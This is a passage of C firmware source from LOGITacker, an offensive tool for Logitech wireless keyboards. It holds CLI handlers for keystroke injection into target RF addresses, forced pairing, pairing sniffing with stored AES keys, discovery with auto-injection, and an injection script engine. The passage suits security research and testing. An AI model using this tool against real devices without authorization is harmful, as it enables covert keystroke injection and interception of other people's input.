    while (fds_record_iterate(&rd,&ft) == NRF_SUCCESS) {
        uint32_t err;
        err = fds_record_open(&rd, &flash_record);
        if (err != NRF_SUCCESS) {
            NRF_LOG_WARNING("Failed to open record %08x", err);
            continue; // go on with next
        }

        sprintf((char *) tmp_str, "Record file_id %04x record_key %04x", flash_record.p_header->file_id, flash_record.p_header->record_key);
        NRF_LOG_INFO("%s",nrf_log_push((char*) tmp_str));

        if (fds_record_close(&rd) != NRF_SUCCESS) {
            NRF_LOG_WARNING("Failed to close record");
        }

    }
}
#endif

static void cmd_version(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "LOGITacker by MaMe82\r\n");
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "Version: %s\r\n", VERSION_STRING);
}


void callback_dummy(nrf_fstorage_evt_t * p_evt) {};
NRF_FSTORAGE_DEF(nrf_fstorage_t m_nfs) =
        {
                .evt_handler    = callback_dummy,
//                .start_addr     = 0xFD000,
//                .end_addr       = 0xFFFFF,
        };
static bool nfs_initiated = false;

static void cmd_erase_flash(nrf_cli_t const * p_cli, size_t argc, char **argv) {
/*
    fds_find_token_t ft;
    memset(&ft, 0x00, sizeof(fds_find_token_t));
    fds_record_desc_t rd;
    while (fds_record_iterate(&rd,&ft) == NRF_SUCCESS) {
        NRF_LOG_INFO("Deleting record...")
        fds_record_delete(&rd);
    }
    fds_gc();
    fds_stat_t stats;
    fds_stat(&stats);
*/

    uint32_t flash_size  = (FDS_PHY_PAGES * FDS_PHY_PAGE_SIZE * sizeof(uint32_t));
    uint32_t end_addr   = helper_flash_end_addr();
    uint32_t start_addr = end_addr - flash_size;

    m_nfs.start_addr = start_addr;
    m_nfs.end_addr = end_addr;


    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Erasing flash from start addr: %x, pages: %d\n", start_addr, FDS_PHY_PAGES);

/*
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Freeable words:  %d\n", stats.freeable_words);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Largest contig:  %d\n", stats.largest_contig);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Words used:      %d\n", stats.words_used);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Words reserved:  %d\n", stats.words_reserved);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Dirty records:   %d\n", stats.dirty_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Valid records:   %d\n", stats.valid_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Open records:    %d\n", stats.open_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Pages available: %d\n", stats.pages_available);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Corruption:      %s\n", stats.corruption ? "yes" : "no");
*/

    if (!nfs_initiated) {
        if (nrf_fstorage_init(&m_nfs, &nrf_fstorage_nvmc, NULL) == NRF_SUCCESS) nfs_initiated = true;
    }
    if (nfs_initiated) nrf_fstorage_erase(&m_nfs, start_addr, FDS_PHY_PAGES, NULL);

    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_RED, "... page erase issued, wait some seconds and re-plug the dongle\n");
}

static void cmd_inject(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    nrf_cli_help_print(p_cli, NULL, 0);
}

static void cmd_inject_target(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "inject target %s\r\n", argv[1]);

    if (argc > 1)
    {
        //nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_DEFAULT, "parameter count %d\r\n", argc);

        //parse arg 1 as address
        uint8_t addr[5];
        if (strcmp(argv[1], "USB") == 0) {
            memset(addr,0x00,5);
            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes to USB keyboard interface\r\n");
        } else {
            if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
                nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
                return;
            }

            char tmp_addr_str[16];
            helper_addr_to_hex_str(tmp_addr_str, 5, addr);
            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes using address %s\r\n", tmp_addr_str);
        }

        //logitacker_keyboard_map_test();
        logitacker_enter_mode_injection(addr);
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "device address needed, format has to be xx:xx:xx:xx:xx\r\n");
        return;

    }

}

static void cmd_script_store(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc == 2)
    {
        if (logitacker_script_engine_store_current_script_to_flash(argv[1])) {
            //NRF_LOG_INFO("storing script succeeded");
            return;
        }
        //NRF_LOG_INFO("Storing script failed");
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "store needs a scriptname as first argument\r\n");
        return;

    }

}

static void cmd_script_load(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc == 2)
    {
        if (logitacker_script_engine_load_script_from_flash(argv[1])) {
            NRF_LOG_INFO("loading script succeeded");
            return;
        }
        NRF_LOG_INFO("loading script failed");
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "load needs a script name as first argument\r\n");
        return;

    }

}

static void cmd_script_remove(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc == 2)
    {
        if (logitacker_script_engine_delete_script_from_flash(argv[1])) {
            NRF_LOG_INFO("deleting script succeeded");
            return;
        }
        NRF_LOG_INFO("deleting script failed");
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "delete needs a script name as first argument\r\n");
        return;

    }
}

static void cmd_script_list(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_script_engine_list_scripts_from_flash(p_cli);
}

/*
static void cmd_inject_pause(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_injection_start_execution(false);
}
*/

static void cmd_inject_execute(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_injection_start_execution(true);
}

static void cmd_script_clear(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_script_engine_flush_tasks();
    NRF_LOG_INFO("script tasks cleared");
}

static void cmd_script_undo(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_script_engine_remove_last_task();
    NRF_LOG_INFO("removed last task from script");
}

static void cmd_inject_onsuccess_continue(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_success = OPTION_AFTER_INJECT_CONTINUE;
}

static void cmd_inject_onsuccess_activeenum(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_success = OPTION_AFTER_INJECT_SWITCH_ACTIVE_ENUMERATION;
}

static void cmd_inject_onsuccess_passiveenum(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_success = OPTION_AFTER_INJECT_SWITCH_PASSIVE_ENUMERATION;
}

static void cmd_inject_onsuccess_discover(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_success = OPTION_AFTER_INJECT_SWITCH_DISCOVERY;
}

static void cmd_inject_onfail_continue(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_fail = OPTION_AFTER_INJECT_CONTINUE;
}

static void cmd_inject_onfail_activeenum(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_fail = OPTION_AFTER_INJECT_SWITCH_ACTIVE_ENUMERATION;
}

static void cmd_inject_onfail_passiveenum(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_fail = OPTION_AFTER_INJECT_SWITCH_PASSIVE_ENUMERATION;
}

static void cmd_inject_onfail_discover(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_fail = OPTION_AFTER_INJECT_SWITCH_DISCOVERY;
}

static void cmd_option_global_workmode_unifying(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.workmode = OPTION_LOGITACKER_WORKMODE_UNIFYING;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "working mode set to Unifying compatible\r\n");
}

static void cmd_option_global_workmode_lightspeed(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.workmode = OPTION_LOGITACKER_WORKMODE_LIGHTSPEED;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "working mode set to LIGHTSPEED compatible\r\n");
}

static void cmd_option_global_workmode_g700(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.workmode = OPTION_LOGITACKER_WORKMODE_G700;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "working mode set to G700/G700s compatible\r\n");
}

static void cmd_option_global_bootmode_discover(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.bootmode = OPTION_LOGITACKER_BOOTMODE_DISCOVER;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "boot mode set to 'discover'\r\n");
}

static void cmd_option_global_bootmode_usbinject(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.bootmode = OPTION_LOGITACKER_BOOTMODE_USB_INJECT;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "boot mode set to 'usb inject'\r\n");
}

static void cmd_option_global_usbinjecttrigger_onpowerup(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.usbinject_trigger = OPTION_LOGITACKER_USBINJECT_TRIGGER_ON_POWERUP;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "USB injection mode set to 'on power up'\r\n");
}

static void cmd_option_global_usbinjecttrigger_onledupdate(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.usbinject_trigger = OPTION_LOGITACKER_USBINJECT_TRIGGER_ON_LEDUPDATE;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "USB injection mode set to 'on LED state update'\r\n");
}

static void cmd_options_inject_lang(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc == 2)
    {
        logitacker_script_engine_set_language_layout(logitacker_keyboard_map_lang_from_str(argv[1]));

        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "need language layout name as first argument (f.e. us, de, da, fr)\r\n");
        return;

    }

}

static void cmd_script_show(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_script_engine_print_current_tasks(p_cli);
}

static void cmd_script_string(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    char press_str[NRF_CLI_CMD_BUFF_SIZE] = {0};
    int str_buf_remaining = sizeof(press_str)-1; //keep one byte for terminating 0x00
    for (int i=1; i<argc && str_buf_remaining>0; i++) {
        if (i>1) strcat(press_str, " ");
        str_buf_remaining--;
        int len = strlen(argv[i]);
        if (len > str_buf_remaining) len = str_buf_remaining;
        strncat(press_str, argv[i], len);
        str_buf_remaining -= len;
    }

    logitacker_script_engine_append_task_type_string(press_str);
}

static void cmd_script_altstring(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    char press_str[NRF_CLI_CMD_BUFF_SIZE] = {0};
    int str_buf_remaining = sizeof(press_str)-1; //keep one byte for terminating 0x00
    for (int i=1; i<argc && str_buf_remaining>0; i++) {
        if (i>1) strcat(press_str, " ");
        str_buf_remaining--;
        int len = strlen(argv[i]);
        if (len > str_buf_remaining) len = str_buf_remaining;
        strncat(press_str, argv[i], len);
        str_buf_remaining -= len;
    }

    logitacker_script_engine_append_task_type_altstring(press_str);
}

static void cmd_script_delay(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1) {
        uint32_t delay_ms;
        if (sscanf(argv[1], "%lu", &delay_ms) != 1) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid delay, argument has to be unsigned int\r\n");
        };

        logitacker_script_engine_append_task_delay(delay_ms);
        return;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid delay, argument has to be unsigned int\r\n");
}

static void cmd_script_press(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    char press_str[NRF_CLI_CMD_BUFF_SIZE] = {0};
    int str_buf_remaining = sizeof(press_str)-1; //keep one byte for terminating 0x00
    for (int i=1; i<argc && str_buf_remaining>0; i++) {
        if (i>1) strcat(press_str, " ");
        str_buf_remaining--;
        int len = strlen(argv[i]);
        if (len > str_buf_remaining) len = str_buf_remaining;
        strncat(press_str, argv[i], len);
        str_buf_remaining -= len;
    }

    NRF_LOG_INFO("parsing '%s' to HID key combo report:", nrf_log_push(press_str));

    hid_keyboard_report_t tmp_report;
    logitacker_keyboard_map_combo_str_to_hid_report(press_str, &tmp_report, LANGUAGE_LAYOUT_DE);
    NRF_LOG_HEXDUMP_INFO(&tmp_report, sizeof(hid_keyboard_report_t));

    logitacker_script_engine_append_task_press_combo(press_str);
}


static void cmd_discover_onhit_activeenum(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    g_logitacker_global_config.discovery_on_new_address = OPTION_DISCOVERY_ON_NEW_ADDRESS_SWITCH_ACTIVE_ENUMERATION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-hit action: start active enumeration of new RF address\r\n");
    return;
}

static void cmd_discover_onhit_passiveenum(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    g_logitacker_global_config.discovery_on_new_address = OPTION_DISCOVERY_ON_NEW_ADDRESS_SWITCH_PASSIVE_ENUMERATION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-hit action: start passive enumeration of new RF address\r\n");
    return;
}

static void cmd_discover_onhit_autoinject(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    g_logitacker_global_config.discovery_on_new_address = OPTION_DISCOVERY_ON_NEW_ADDRESS_SWITCH_AUTO_INJECTION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-hit action: enter injection mode and execute injection\r\n");
    return;
}

static void cmd_discover_onhit_continue(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    g_logitacker_global_config.discovery_on_new_address = OPTION_DISCOVERY_ON_NEW_ADDRESS_CONTINUE;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-hit action: continue\r\n");
}

static void cmd_pair_sniff_onsuccess_continue(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.pair_sniff_on_success = OPTION_PAIR_SNIFF_ON_SUCCESS_CONTINUE;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-success action: continue\r\n");
}

static void cmd_pair_sniff_onsuccess_discover(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.pair_sniff_on_success = OPTION_PAIR_SNIFF_ON_SUCCESS_SWITCH_DISCOVERY;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-success action: enter discover mode\r\n");
}

static void cmd_pair_sniff_onsuccess_passiveenum(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.pair_sniff_on_success = OPTION_PAIR_SNIFF_ON_SUCCESS_SWITCH_PASSIVE_ENUMERATION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-success action: enter passive enumeration mode\r\n");
}

static void cmd_pair_sniff_onsuccess_activeenum(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.pair_sniff_on_success = OPTION_PAIR_SNIFF_ON_SUCCESS_SWITCH_ACTIVE_ENUMERATION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-success action: enter active enumeration mode\r\n");
}

static void cmd_pair_sniff_onsuccess_autoinject(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.pair_sniff_on_success = OPTION_PAIR_SNIFF_ON_SUCCESS_SWITCH_AUTO_INJECTION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-success action: enter injection mode and execute injection\r\n");
}

static void cmd_pair_sniff_run(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_enter_mode_pair_sniff();
}

static void cmd_pair_device_run(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_DEFAULT, "parameter count %d\r\n", argc);

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to force pair using address %s\r\n", tmp_addr_str);
        logitacker_enter_mode_pair_device(addr);
        return;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to pair using Unifying global pairing address\r\n");
    logitacker_enter_mode_pair_device(UNIFYING_GLOBAL_PAIRING_ADDRESS);
}

static void cmd_help(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    nrf_cli_help_print(p_cli, NULL, 0);
}

static void cmd_pair(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if ((argc == 1) || nrf_cli_help_requested(p_cli))
    {
        nrf_cli_help_print(p_cli, NULL, 0);
        return;
    }

    if (argc != 2)
    {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "%s: bad parameter count\r\n", argv[0]);
        return;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "%s: unknown parameter: %s\r\n", argv[0], argv[1]);
}

static void cmd_discover_run(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_enter_mode_discovery();
}

static void cmd_discover(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    if ((argc == 1) || nrf_cli_help_requested(p_cli))
    {
        nrf_cli_help_print(p_cli, NULL, 0);
        return;
    }

    if (argc != 2)
    {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "%s: bad parameter count\r\n", argv[0]);
        return;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "%s: unknown parameter: %s\r\n", argv[0], argv[1]);
}

static void cmd_devices(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_devices_list_iterator_t iter = {0};
    logitacker_devices_unifying_dongle_t * p_dongle = NULL;
    logitacker_devices_unifying_device_t * p_device = NULL;
    while (logitacker_devices_get_next_dongle(&p_dongle, &iter) == NRF_SUCCESS) {
        if (p_dongle != NULL) {

            for (int device_index=0; device_index < p_dongle->num_connected_devices; device_index++) {
                p_device = p_dongle->p_connected_devices[device_index];

                print_logitacker_device_info(p_cli, p_device);
            }
        }
    }
}

static void cmd_devices_remove(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Deleting device %s\r\n", tmp_addr_str);
        logitacker_devices_del_device(addr);
        return;
    }
}

static void cmd_devices_add(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_devices_unifying_device_t * p_device;
    if (argc > 1)
    {
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "adding device %s as plain injectable keyboard\r\n");

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Adding device %s\r\n", tmp_addr_str);


        if (logitacker_devices_create_device(&p_device, addr) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "Error adding device %s\r\n", tmp_addr_str);
            return;
        }

        // add keyboard capabilities
        p_device->report_types |= LOGITACKER_DEVICE_REPORT_TYPES_KEYBOARD | LOGITACKER_DEVICE_REPORT_TYPES_MEDIA_CENTER | LOGITACKER_DEVICE_REPORT_TYPES_MULTIMEDIA | LOGITACKER_DEVICE_REPORT_TYPES_POWER_KEYS;

        if (argc > 2) {
            uint8_t key[16] = {0};
            if (helper_hex_str_to_bytes(key, 16, argv[2]) != NRF_SUCCESS) {
                nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid key parameter, format has to be xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\r\n");
                return;
            }

            // add key and mark device as link-encryption enabled
            memcpy(p_device->key, key, 16);
            p_device->key_known = true;
            p_device->caps |= LOGITACKER_DEVICE_CAPS_LINK_ENCRYPTION;

            nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "added key to device\r\n");
        }
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "syntax to add a device manually:\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "    devices add <RF-address> [AES key]\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "example device no encryption   : devices add de:ad:be:ef:01\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "example device with encryption : devices add de:ad:be:ef:02 023601e63268c8d37988847af1ae40a1\r\n");
    };
}

static void cmd_devices_storage_save(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Storing device %s to flash\r\n", tmp_addr_str);
        logitacker_devices_store_ram_device_to_flash(addr);
        return;
    }
}

// dynamic creation of command addresses
static void cmd_devices_storage_remove(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {
        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Deleting device %s from flash\r\n", tmp_addr_str);
        logitacker_devices_remove_device_from_flash(addr);
        return;
    }

}

static void cmd_devices_storage_load(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {
        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Restoring device %s from flash\r\n", tmp_addr_str);
        logitacker_devices_unifying_device_t * p_dummy_device;
        logitacker_devices_restore_device_from_flash(&p_dummy_device, addr);
        return;
    }
}

static void cmd_devices_storage_list(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    fds_find_token_t ftok;
    fds_record_desc_t record_desc;
    fds_flash_record_t flash_record;
    memset(&ftok, 0x00, sizeof(fds_find_token_t));

    logitacker_devices_unifying_device_t tmp_device;
    logitacker_devices_unifying_dongle_t tmp_dongle;

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "list of devices stored on flash:\r\n");
    NRF_LOG_INFO("Devices on flash");
    while(fds_record_find(LOGITACKER_FLASH_FILE_ID_DEVICES, LOGITACKER_FLASH_RECORD_KEY_DEVICES, &record_desc, &ftok) == NRF_SUCCESS) {
        if (fds_record_open(&record_desc, &flash_record) != NRF_SUCCESS) {
            NRF_LOG_WARNING("Failed to open record");
            continue; // go on with next
        }

        logitacker_devices_unifying_device_t const * p_device = flash_record.p_data;

        //we need a writable copy of device to assign dongle data
        memcpy(&tmp_device, p_device, sizeof(logitacker_devices_unifying_device_t));



        if (fds_record_close(&record_desc) != NRF_SUCCESS) {
            NRF_LOG_WARNING("Failed to close record")
        }

        // load stored dongle (without dongle data, classification like "is logitech" would be missing)
        if (logitacker_flash_get_dongle_for_device(&tmp_dongle, &tmp_device) == NRF_SUCCESS) tmp_device.p_dongle = &tmp_dongle;
        print_logitacker_device_info(p_cli, &tmp_device);

    }
}


static void cmd_devices_remove_all(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_devices_del_all();
}

static void cmd_options_show(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_options_print(p_cli);
}

static void cmd_options_inject_maxautoinjectsperdevice(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1) {
        int count;
        if (sscanf(argv[1], "%d", &count) != 1) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid argument, auto inject count has to be a integer number, but '%s' was given\r\n", argv[1]);
        } else {
            g_logitacker_global_config.max_auto_injects_per_device = count;
        }
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid argument, auto inject count has to be a integer number\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "current setting of maximum per device auto-injects: %d\r\n", g_logitacker_global_config.max_auto_injects_per_device);
    }
}

static void cmd_options_store(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_options_store_to_flash();
}

static void cmd_options_erase(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    fds_file_delete(LOGITACKER_FLASH_FILE_ID_GLOBAL_OPTIONS);
}

static void cmd_options_inject_defaultscript(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1) {
        size_t len = strlen(argv[1]);
        if (len > LOGITACKER_SCRIPT_ENGINE_SCRIPT_NAME_MAX_LEN-1) len = LOGITACKER_SCRIPT_ENGINE_SCRIPT_NAME_MAX_LEN-1;
        memcpy(g_logitacker_global_config.default_script, argv[1], len);
        g_logitacker_global_config.default_script[len] = 0x00;
        return;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "default injection script: '%s'\r\n", g_logitacker_global_config.default_script);
}

static void cmd_options_inject_defaultscript_clear(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.default_script[0] = 0x00;
}

static void cmd_options_pairsniff_autostoredevice(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.auto_store_sniffed_pairing_devices = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.auto_store_sniffed_pairing_devices = true;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "auto-store devices after pairing has been sniffed successfully: %s\r\n", g_logitacker_global_config.auto_store_sniffed_pairing_devices ? "on" : "off");
}

static void cmd_options_discover_autostoreplain(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.auto_store_plain_injectable = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.auto_store_plain_injectable = true;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "auto-store discovered devices, if they allow plain injection: %s\r\n", g_logitacker_global_config.auto_store_plain_injectable ? "on" : "off");
}

static void cmd_options_passiveenum_pass_keyboard(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.passive_enum_pass_through_keyboard = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.passive_enum_pass_through_keyboard = true;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "passive-enum USB keyboard pass-through: %s\r\n", g_logitacker_global_config.passive_enum_pass_through_keyboard ? "on" : "off");
}

static void cmd_options_passiveenum_pass_mouse(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.passive_enum_pass_through_mouse = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.passive_enum_pass_through_mouse = true;

    }

